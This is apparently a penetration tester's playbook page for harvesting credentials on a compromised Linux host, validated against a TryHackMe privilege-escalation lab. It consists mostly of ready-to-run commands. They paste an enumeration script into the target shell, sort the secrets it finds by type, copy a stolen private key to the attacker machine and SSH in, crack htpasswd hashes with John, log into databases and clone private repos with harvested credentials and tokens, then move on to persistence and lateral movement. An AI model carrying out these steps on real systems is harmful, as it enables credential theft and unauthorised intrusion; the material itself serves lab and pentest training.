
**Pre-root** credential harvesting. Read-only enum from foothold user's perspective.

---

## Step 1 — Paste and run `config_enum.sh`

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/config_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `CONFIG_CRED[<file>]: <line>` → credential pattern hit. Multiple lines may appear across same and different files. Each is a candidate. → Proceed to Step 2 with the candidate list.
- `CONFIG_FOUND: <file>` → informational; script scanned this file, no credential pattern matched. No action (delete or ignore these lines if you wish).
- `CONFIG_EMPTY` → no readable config files exist. Technique inapplicable. Return to [[Linux Privilege Escalation Checksheet]] `Credential Harvesting`.
- No `CONFIG_CRED` markers in output → script found no creds in any config file. Return to [[Linux Privilege Escalation Checksheet]] `Credential Harvesting`.

---

## Step 2 — Identify cred type, then apply matching handler

For each candidate from Step 1, identify its **Cred type** by matching `<line>` against the table. Table rows, handler sections, and processing order are all the same (priority order — yield × speed): process all candidates of the first row's type, then the second row's, etc.

| Cred type          | Signature in `<line>`                                                                                                                                                                                    |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Key=value password | Default — `any line not matching one of the patterns below; key-name + value in INI, YAML, JSON, PHP` OR command flag type format (e.g `-p password`) OR `key = /path/to/key/or/auth/file` pattern, etc. |
| PEM private key    | Contains `-----BEGIN [A-Z ]+PRIVATE KEY-----`                                                                                                                                                            |
| pgpass entry       | `<host>:<port>:<db>:<user>:<password>` (four colons, often with `*` wildcards)                                                                                                                           |
| htpasswd hash      | `<user>:<hash>` (one colon + hash prefix `$apr1$`, `$2y$`, `$1$`, `$5$`, `$6$`, or `{SHA}`)                                                                                                              |
| URL-embedded       | Contains `<scheme>://<user>:<pass>@<host>`                                                                                                                                                               |
| Service token      | Contains `ghp_`, `xox[bpas]-`, `sk_live_`, `sk_test_`, or `Bearer`                                                                                                                                       |

All candidates exhausted with no root yield → return to [[Linux Privilege Escalation Checksheet]] `Credential Harvesting`.

#### Key=value password handler

`<line>` is either a **pointer** (i.e. contains a `<path>`) to a credential file or is a **literal** credential, branch accordingly:

###### **Pointer**:

`cat <path>` on target. 

(If `<path>` uses a `$<var>` — e.g. `$dir/private/cakey.pem`, then you must resolve `<var>`  from `<file>` first: `grep -iE '^[[:space:]]*<var>[[:space:]]*=' <file>`)

Branch by output:

- `-----BEGIN [A-Z ]+PRIVATE KEY-----` block → restart at PEM private key handler below.
- `<user>:<hash>` → restart at htpasswd hash handler above.
- `<key>=<value>`, `<key>:<value>` type lines → feed each into the Step 2 type table above.
- Non-blank lines, i.e. no `=` or `:` etc. → are the lines themselves `<user>` and `<password>`. Skip to the `su <user>` section in **Literal Credential** section, below, and try `<user>` and `<password>` combination(s). 
- `Permission denied`,  `No such file or directory` etc. → log `<path>` for post-root extraction. Next candidate.

###### **Literal Credential** — e.g. `password=secret123`. 

Identify target principal (`<user>`) from `<file>`:

- `/etc/<service>/...` → cred is for `<service>` (mysql, postfix, postgresql, samba, etc.).
- `/var/www/.../wp-config.php`, `configuration.php`, `settings.py`, `database.yml`, `application.properties` → cred is for the database `<DB_USER>` in same file. Extract `<DB_USER>` with `grep -iE 'user|username' <file>`.
- `<home>/.<dotfile>` → cred is for the user owning `<home>` (basename of `<home>`).

`su <user>`

(Enter `<password>` at prompt.) 

`id`

- `uid=0(root)` → root achieved. Proceed to Decision.
- Non-root `<user>` → lateral foothold. Re-enter [[Linux Privilege Escalation Checksheet]] from `<user>`'s context.
- `Authentication failure` → either (a) target user guess wrong → try same `<password>` against next likely user, or (b) cred is for a non-local service:
    - MySQL cred + `mysqld` running as root → [[MySQL UDF]]
    - Postgres cred + `postgres` running as root → [[Postgres UDF]]
    - SSH cred (host reachable from foothold) → `ssh <user>@<host>`
    - API token / cloud key / app-specific cred → log for later, next candidate.

#### PEM private key handler

On target:

`cat <file>`

Copy the displayed output (from `-----BEGIN` through `-----END` inclusive). On attacker:

`cat > /tmp/key.pem << 'EOF'`

(Paste the key, then on a new line type `EOF` and Enter.)

`chmod 600 /tmp/key.pem`

Identify the user the key belongs to:

- File path `/home/<user>/...` or `<home>/...` → `<user>` from path.
- File path generic (`/etc/...`, `/opt/...`) → try `<user>` from interactive accounts: `awk -F: '($3==0||$3>=1000)&&$7!~/(nologin|false)/{print $1}' /etc/passwd`. Prioritise `root`.

`ssh -i /tmp/key.pem <user>@<target>`

- Connection succeeds → in as `<user>`. `id` — `uid=0(root)` → root achieved, Decision. Otherwise re-enter [[Linux Privilege Escalation Checksheet]] from `<user>`'s context.
- `Permission denied (publickey)` → key not authorized for `<user>`; try next `<user>`. All exhausted → next candidate.

#### pgpass entry handler

Line gives `<host>:<port>:<db>:<user>:<password>` directly (wildcards `*` mean "any").

`PGPASSWORD='<password>' psql -h <host> -p <port> -U <user> -d <db> -c '\du'`

(Substitute `localhost` for wildcard `<host>`, `5432` for wildcard `<port>`, `postgres` for wildcard `<db>`.)

- Connection succeeds + `<user>` row shows `Superuser` AND postgres process runs as system root → [[Postgres UDF]]
- Connection succeeds + no superuser → database access; pivot via SQL for app secrets or further creds. Next candidate.
- `FATAL: password authentication failed` → cred stale; next candidate.

#### htpasswd hash handler

Save and crack:

`echo '<user>:<hash>' > /tmp/.htp.hash`

`john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/.htp.hash`

- John prints `<plaintext>:<user>` → loop with `<plaintext>` as `<password>` and `<user>` as target → `Key=value password handler`.
- John reports "No password hashes loaded" → add explicit format and retry: `john --format=apache --wordlist=/usr/share/wordlists/rockyou.txt /tmp/.htp.hash` (or `--format=bcrypt` for `$2y$`, `--format=md5crypt` for `$1$`/`$apr1$`).
- Not cracked after rockyou → log hash for later, next candidate.

#### URL-embedded handler

Extract `<user>`, `<pass>`, `<scheme>`, `<host>` from line. Branch by `<scheme>`:

- `mysql://` / `mariadb://` → `mysql -h <host> -u <user> -p<pass>`
- `postgres://` / `postgresql://` → `PGPASSWORD='<pass>' psql -h <host> -U <user>`
- `mongodb://` → `mongosh "mongodb://<user>:<pass>@<host>"`
- `redis://` → `redis-cli -h <host> -a <pass>`
- `ssh://` → `sshpass -p '<pass>' ssh <user>@<host>` (`apt install sshpass` on attacker if missing)
- `http://` / `https://` → web app cred; log for later web-route work.

Successful service connection → service is now an exploitation surface (UDF, lateral, data extraction). Connection failure → next candidate.

#### Service token handler

Most service tokens have no direct local-privesc value:

- GitHub PAT (`ghp_...`) → GitHub API / clone private repos: `git clone https://<token>@github.com/<org>/<repo>`. Log for later (private repos may yield further creds in commit history or `.env`-style files).
- Slack (`xoxb-...`), Stripe (`sk_...`), generic `Bearer` → external services. Log for later.

Exception: token gates an internal service reachable from foothold (internal Vault, internal CI, internal API) → use directly: `curl -H "Authorization: Bearer <token>" http://<internal-host>/<endpoint>`.

---
## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---

## Validation

THM:Linux PrivEsc:Task 17 Passwords & Keys - Config Files